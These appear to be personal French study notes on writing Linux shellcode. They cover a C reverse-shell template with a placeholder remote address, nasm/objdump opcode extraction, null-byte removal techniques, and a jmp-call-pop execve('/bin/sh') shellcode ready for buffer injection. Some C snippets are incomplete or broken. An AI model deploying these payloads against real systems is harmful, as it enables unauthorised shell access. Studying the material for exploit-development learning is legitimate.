 
Un shellcode s'est générallement écrit en assembler puis converti en hexa car on doit directement manipuler les registres et les fonctions.


## Choses à savoir
https://blog.securitybreak.io/reverse-engineering-tips-debugging-shellcode-e821290a7d61
### Processus de création de shellcode

- Le processus en soi est plus ou moins toujours le même.

###### 1. Écriture de la fonction du shellcode en langage high-level

- Là le but c'est de créer une "template" de l'utilité de ton shellcode. Souvent, on veut faire du privilège escalation ou du reverse shell.
- Le mieux c'est de directement faire le shellcode en asm pour ne pas avoir à analyser le code asm provenant du code en C.

**Exemple de programme en C à transformer en shellcode**
```C
/*Écrire dans un fichier*/
#include <stdio.h>
int main() {
    FILE *fp;
    char buffer[256];

    printf("Entrez le texte à écrire dans le fichier : ");
    fgets(buffer, sizeof(buffer), stdin);

    fp = fopen("file.txt", "w");
    if (fp == NULL) {
        printf("Impossible d'ouvrir le fichier.\n");
        return 1;
    }
```



```C
/*Lancement d'un shell*/
#include <stdio.h>
#include <stdlib.h>

int main(){
	system("/bin/sh");
	return 0;
}
```



```C
/*Reverse shell sur linux target*/
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "XXX.XXX.XXX.XXX"
#define REMOTE_PORT XXX

int main(int argc, char *argv[])
	struct sockaddr_in sa;
	int s;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
	sa.sin_port = htons(REMOTE_PORT);
	s = socket(AF_INET, SOCK_STREAM, 0);
	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	execve("/bin/sh", 0, 0);
	return 0;

}
```

###### 2. Compilation et désassemblage du programme high-level

- On va maintenant compiler le programme afin de le transformer en fichier binaire et de récupérer l'assembleur. Pour ça, on utilise gcc ou autre compiler.
- Quand tu as le fichier binaire, tu le désassemble avec objdump

###### 3. Analyse du programme assembleur

- Là le but c'est de comprendre exactement comment fonctionne le programme. Ça passe donc par :
	- Trouver les emplacements de tes inputs, des variables, des paramètres.
	- Ce que contiennent les registres du genre rax, rbx...
	- Regarder comment fonctionnent les fonctions appelé, par exemple quels sont les arguments nécessaires, dans quels registres sont-ils placés...


###### 4. Nettoyage du code assembleur pour qu'il soit plus petit et injectable

- Avec l'analyse effectuée, tu repères donc les éléments importants pour la fonctionnalité que tu vas faire. Donc les trucs du genre assignation de valeurs aux registres, tu gardes. Les appels de fonction nécessaires pareil. 


###### 5. Extraction des opcodes et création du shellcode

^19a022

- On va 1) créer notre object file avec nasm, 2) lier les objets afin de créer notre fichier exécutable avec id et enfin 3) extraire le code formaté avec objdump.
	- 1)
		- `nasm -f elf64 exit_shellcode.asm`
		- où -f indique le format de l'output et le fichier asm c'est le fichier input
	- 2)
		- `ld -o exit_shellcode exit_shellcode.o`
		- où -o indique le fichier output et le fichier .o c'est l'input
	- 3)
		- `objdump -d exit_shellcode`
		- il va afficher un truc du genre 
```asm
exit_shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       bb 00 00 00 00          mov    $0x0,%ebx
  401005:       b8 e7 00 00 00          mov    $0xe7,%eax
  40100a:         0f 05                              syscall
```
- 
	- Ce qui va nous interesser c'est la représentation en hexa qu'on va transformer en shellcode :
```
“\xbb\x00\x00\x00\x00”
“\xb8\xe7\x00\x00\x00”
“\x0f\x05”
```








###### 6. Test du bon fonctionnement

- Tu peux créer un petit programme qui exécute le shellcode. Par exemple :
```C
#include <stdio.h>
#include <string.h>
char shellcode[] = "SHELLCODE";

int main() {
    void (*shell)();
    shell = (void (*)())shellcode;
    shell();
    return 0;
}
```
- Dans ce programme, on créer un pointeur de fonction `void(*shell)();` qui ne prend aucun argument. 
- Ensuite, la ligne `shell = (void (*)())shellcode;` permet de faire pointer le pointeur de fonction shell vers notre shellcode
- `(void (*)())` est la syntaxe pour déclarer un pointeur de fonction. Entre les parenthèses, vous spécifiez le type de fonction que le pointeur pointera vers. Dans ce cas, il s'agit d'une fonction qui ne prend aucun argument et retourne `void`.
- `shell` est une variable qui est déclarée comme un pointeur de fonction. En utilisant la conversion de type, nous faisons en sorte que `shell` pointe vers le début du tableau `shellcode`.
- Enfin, on exécute le shellcode avec `shell()`
### Random Tips

- **Compiler le shellcode avec gcc et l'option -static pour ne pas avoir de problème de dynamic link**
### - Suppression des octet null

- Notre objectif c'est de mettre un shellcode dans un buffer, de préférence de chaine de caractère. Seulement, dans les buffer char, les octet \x00 sont interprétés comme des retours à la ligne. Or, on en a souvent dans nos shellcodeS donc ça va provoquer des erreurs.
- On a donc plusieurs techniques pour pallier à ce problème.
###### - Utilisation de l'opcode xor

- Pour l'exemple, je vais reprendre le shellcode exit() dans lequel on peut voir des octets nuls.
```asm
  401000:       bb 00 00 00 00          mov    $0x0,%ebx
  401005:       b8 e7 00 00 00          mov    $0xe7,%eax
  40100a:         0f 05                              syscall
```
- Dans la première instruction, on voit qu'on définit %ebx à 0. On va exploiter le fait que l'instruction xor retourne la valeur 0 quand les 2 opérands sont égaux.
- On remplace donc avec `xor ebx, ebx`

###### - Fragmentation des registres

- Pour l'exemple, je vais reprendre le shellcode exit() dans lequel on peut voir des octets nuls.
```asm
  401000:       bb 00 00 00 00          mov    $0x0,%ebx
  401005:       b8 e7 00 00 00          mov    $0xe7,%eax
  40100a:         0f 05                              syscall
```
- Dans la seconde instruction, on voit que le registre eax (32 bits) ne prend qu'un seul octet sur les 4.
- On sait qu'il peut être coupé en plusieurs morceaux comme sur le schéma :
  
- ![Pasted image 20240227225449.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/Pasted%20image%2020240227225449.png)
  
- On va donc pouvoir simplement définir le registre AL pour ne pas avoir à définir les autres octets sur 0.

###### - Utilisation de push et pop

- Pour l'exemple on va utiliser :
```asm
xor    %edi,%edi            >       31 ff         
mov    $0x3c,%eax      >       b8 3c 00 00 00          
syscall                                >       0f 05
```
- Là c'est une plus grande valeurs mais on pourrait quand même utiliser la fragmentation. 
- Cependant, on peut aussi utiliser les fonctions push qui ajoute un élément tout en haut de la pile, et pop qui retire l'élément tout en haut de la pile pour le mettre dans l'opérand. On le fait donc en 2 étapes mais ça marche aussi.
- Ça nous donnera 
```asm
push $0x3c
pop %eax
```


###### - Utilisation de décalage de bits
https://null-byte.wonderhowto.com/how-to/writing-64-bit-shellcode-part-2-removing-null-bytes-0161591/
- Pour notre exemple, on imagine qu'on veuille placer la string /bin/sh dans un registre %rbx.
- Pour ce faire, on va déjà prendre les caractère en hexa puis les mettre en forme pour le little-indian. Ca nous donne `movq $0x0068732f6e69622f, %rbx` 
- Sauf que le dernier octet c'est 00 donc on va devoir le changer en un octet non nul (n'importe lequel).
- `movq $0x1168732f6e69622f, %rbx` 
- Ensuite, on va décaler l'hexa de 0x08 vers la gauche (1 bit en hexa vaut 4 bit en bin) puis refaire un décalage vers la droite pour ajouter les nuls bytes. Ça va donc ressembler à 
```asm
movq $0x1168732f6e69622f, %rbx
shl $0x08, %rbx
shr $0x08, %rbx
```
## Les appels système Syscall 

- **C'est quoi cette merde ?**
	- Un appel système c'est une instruction en asm (syscall pour 64 bits et pour les 32 bits c'était 0x80 suivit du numéro de syscall) notamment qui fait passer le kernel de base en user mode vers le kernel mode qui peut effectuer des actions avec des privilèges élevés. Un access exception est donc lancé.
	- Ils sont souvent utilisés par les fonctions de base comme malloc(), read ou encore execv().
	- C'est interéssant quand on veut créer un shellcode car ça nous donne la possibilité d'effectuer des tâches sans nous préoccuper des privilèges.
- **Création de ton premier shellcode tout pourri qui sert à kedal**
	- Si on prend l'exemple de la fonction exit() en C :
```
int main(){
	exit(0);
}
```
- Si on disas exit :
```asm
   0x00000000004102e0 <+0>:     mov    $0xffffffffffffffc0,%rsi
   0x00000000004102e7 <+7>:     mov    $0xe7,%edx
   0x00000000004102ec <+12>:    jmp    0x4102f1 <_exit+17>
   0x00000000004102ee <+14>:    xchg   %ax,%ax
   0x00000000004102f0 <+16>:    hlt
   0x00000000004102f1 <+17>:    mov    %edx,%eax
   0x00000000004102f3 <+19>:    syscall
   0x00000000004102f5 <+21>:    cmp    $0xfffffffffffff000,%rax
   0x00000000004102fb <+27>:    jbe    0x4102f0 <_exit+16>
   0x00000000004102fd <+29>:    neg    %eax
   0x00000000004102ff <+31>:    mov    %eax,%fs:(%rsi)
   0x0000000000410302 <+34>:    jmp    0x4102f0 <_exit+16>
```
- 
	- On voit qu'on effectue un syscall avec le registre %eax qui contient 0xe7 (231 en décimal).
	- Bon enfin bref on s'en tape nous on veut créer un shellcode. Pour ça, il faut bien choisir les éléments dont on a vraiment besoin pour gagner de la place dans le shellcode. 
	- Ce qu'il nous faut c'est l'instruction qui place 0 dans %ebx pour indiquer qu'on a pas d'autre arguments à passer, l'instruction qui place 231 dans %eax pour indiquer le numéro de syscall et enfin l'instruction syscall en elle-même. On va donc le mettre sous la forme :
```asm
Section .text

	global _start

_start:
	mov ebx, 0
	mov eax, 231
	syscall
```
- 
	- Ensuite, on va 1) créer notre object file avec nasm, 2) lier les objets afin de créer notre fichier exécutable avec id et enfin 3) extraire le code formaté avec objdump.
	- 1)
		- `nasm -f elf64 exit_shellcode.asm`
		- où -f indique le format de l'output et le fichier asm c'est le fichier input
	- 2)
		- `ld -o exit_shellcode exit_shellcode.o`
		- où -o indique le fichier output et le fichier .o c'est l'input
	- 3)
		- `objdump -d exit_shellcode`
		- il va afficher un truc du genre 
```asm
exit_shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       bb 00 00 00 00          mov    $0x0,%ebx
  401005:       b8 e7 00 00 00          mov    $0xe7,%eax
  40100a:         0f 05                              syscall
```
- 
	- Ce qui va nous interesser c'est la représentation en hexa qu'on va transformer en shellcode :
```
“\xbb\x00\x00\x00\x00”
“\xb8\xe7\x00\x00\x00”
“\x0f\x05”
```

^2fe94c

- 
	- Si tu le mets dans un programme pour tester et qu'ensuite t'utilise Strace pour voir les appels systèmes et les signaux, tu verras à la fin la fonction exit(0).
```C
char shellcode[] = "\xbb\x00\x00\x00\x00"
                 "\xb8\x01\x00\x00\x00"
                 "\xcd\x80";
int main(){
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}
```

```
execve("./chiassefroc", ["./chiassefroc"], 0x7ffe0a5d55f0 /* 32 vars */) = 0
brk(NULL)                               = 0x55d7429b0000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f2886ff5000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=100191, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 100191, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f2886fdc000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220x\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=1926256, ...}, AT_EMPTY_PATH) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 1974096, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f2886dfa000
mmap(0x7f2886e20000, 1396736, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f2886e20000
mmap(0x7f2886f75000, 344064, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17b000) = 0x7f2886f75000
mmap(0x7f2886fc9000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1cf000) = 0x7f2886fc9000
mmap(0x7f2886fcf000, 53072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f2886fcf000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f2886df7000
arch_prctl(ARCH_SET_FS, 0x7f2886df7740) = 0
set_tid_address(0x7f2886df7a10)         = 314929
set_robust_list(0x7f2886df7a20, 24)     = 0
rseq(0x7f2886df8060, 0x20, 0, 0x53053053) = 0
mprotect(0x7f2886fc9000, 16384, PROT_READ) = 0
mprotect(0x55d74191b000, 4096, PROT_READ) = 0
mprotect(0x7f2887027000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f2886fdc000, 100191)          = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```
## Exemple création de shellcode

### Spawner de shell

#### Création d'un nouveau processus

##### Remplacement d'un processus existant

###### Utilisation de execve() 

- **Shellcode en C**
```C
#include <stdio.h>
int main(){
	char *happy[2];
	happy[0] = "/bin/sh";
	happy[1]=NULL;
	execve (happy[0], happy, NULL);
}
```
- **Compilation et désassemblage**
	- `gcc -static spawnshell.c -o spawnshell `
	- Bon bah là c'est pas hyper interéssant étant donnée qu'on s'interroge plutôt sur le fonctionnement de la fonction execve(). D'ailleurs, en temps normal on ne fait pas de décompilation mais plutôt un pseudo-code pour faire le code assembleur au lieu de faire un programme en C. C'est plus rapide et ça entraine à la compréhension de l'asm.
- **Analyse du code source asm**
	- On va d'abord étudier en profondeur la fonction execve. On sait qu'on va juste utiliser les deux premier paramètre car on s'en branle de mettre des variables d'environnement. Ces deux paramètres devront être pointeurs. 
	- Bon là on a un petit problème (dégager les nul bytes) et un gros problème (dégager les adresses hardcoded pour que le shellcode puisse s'adapter à tout les programmes).
	- Pour les nuls bytes, on s'en fout un peu c'est simple, on passe donc au problème des adresses.
	- On va utiliser des adresses relatives à la base de la pile. En fait, on va créer nous même une pile. L'adresse de retour (adresse juste après l'instruction call) sera directement envoyée sur la pile. On va alors mettre une "instruction" qui définit une string qu'on va modifier après. Ensuite, on va pop le dernier élément de la stack (l'adresse de retour) vers le registre ESI. Ce registre va alors contenir une adresse d'INSTRUCTION mais qui contient notre string qu'on va modifier. On pourra se servir de ce registre pour référencer n'importe quel endroit de la pile. (la classe à Dallas)
	- Pour faire cette pile, on peut utiliser un jmp qui renvoie vers une étiquette qui, elle, utilise un call (vers l'étiquette de notre shellcode) avec un Defined Byte qui définit la string '/bin/sh' qui sera donc sur l'adresse de retour. Donc la première instruction du shellcode devra être un `pop esi` pour dégager /bin/sh de la pile et foutre son adresse dans ESI.

```asm
jmp short                   GotoCall

shellcode:
	pop                    esi
	...
	reste du shellcode
	...

GotoCall:
	Call                   shellcode
	Db                     '/bin/sh'
```
- 
	- Passons au reste du shellcode. On va, à la place de /bin/sh, utiliser des placeholder pour réserver l'espace dans la mémoire et ensuite les modifier pour gérer les arguments sans avoir de problème de null bytes. 
	- Il va ressembler à `/bin/shJAAAAKKKK` J va être un octet NULL car on sait que les paramètres de execve() doivent se terminer par un octet NULL. Donc quand on fera référence à /bin/sh, la fonction arrêtera de lire à l'octet NULL. 
	- À la place des AAAA, on va mettre l'adresse de début de /bin/sh car execve() l'exige . C'est 4 A car on est dans l'exemple sur une architecture 32 bits donc étant données que A = 8bits et une adresse = 32bits... 
	- À la place de KKKK, on va foutre des octet null car on s'en bat les couilles de ce paramètre. On fait ça pour éviter de mettre des octets null dans le shellcode. Tu vas comprendre en fait on charge eax qui est égale à 0.
	- Grâce à ça, on va pouvoir charger ce qui sera sur les placeholder vers les registres ebx (pour le 2ème argument, l'adresse de /bin/sh), ecx (pour le 3ème argument, la commande /bin/sh en elle-même), edx (pour le 4ème argument, les NULL bytes) et on pourra mettre le numéro de syscall pour la fonction execve() dans eax (on le mettra dans al pour éviter les NULL bytes). Enfin, on appellera le syscall (int 0x80 car architecture 32bits).
```asm
Section			.text

	global _start

_start:

	jmp short	GotoCall

shellcode:

	pop		esi
	xor		eax, eax
	mov byte	[esi + 7], al
	lea		ebx, [esi]
	mov long	[esi + 8], ebx
	mov long	[esi + 12], eax
	mov byte	al, 0x0b
	mov		ebx, esi
	lea		ecx, [esi + 8]
	lea		edx, [esi + 12]
	int		0x80

GotoCall:

	Call		shellcode
	db		‘/bin/shJAAAAKKKK’
```
- 
	- Enfin, on va extraire nos opcodes et construire notre shellcode.
	- Tu pourras donc utiliser ou créer des programmes qui injectes des shellcode dans des buffer avec des padding et tout le tralala et qui vont le mettre dans une variable d'environnement par exemple et te lançeront un shell à l'intérieur du programme pour pouvoir avoir un environnement et donc lancer le programme cible avec en paramètre la variable d'environnement. Enfin tu te demerde comme tu peux quoi.





##### Copie d'un processus existant et exécution dans ce nouvel environnement


###### Utilisation de fork() et execve() 
